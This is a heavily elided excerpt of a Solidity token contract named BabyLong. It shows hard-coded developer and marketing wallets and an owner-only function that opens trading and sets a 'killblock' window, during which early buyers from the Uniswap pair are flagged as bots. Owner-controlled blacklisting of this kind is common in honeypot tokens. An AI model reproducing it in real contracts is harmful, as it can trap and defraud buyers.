...
contract BabyLong is Context, IERC20, Ownable {
    ...
    uint256 private constant _tTotal = 420000000000 * 10 ** 6 * 10 ** 9;
    ...
    address payable private _developmentAddress =
        payable(0xe02b5e1D8af284acE51e1b8548D81a45b9d8c6a3);
    address payable private _marketingAddress =
        payable(0x9d2Fe3611339fAaA3c6C1bc4CF78d76C4B6f5EC1);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
                ...
                require(startTrade > 0, "bot open trade");
                if (
                    block.number < startTrade + killblock &&
                    from == uniswapV2Pair
                ) {
                    bot[to] = true;
                }
    ...
    function openTrade(uint256 _kill) public onlyOwner {
        startTrade = block.number;
        killblock = _kill;
    }
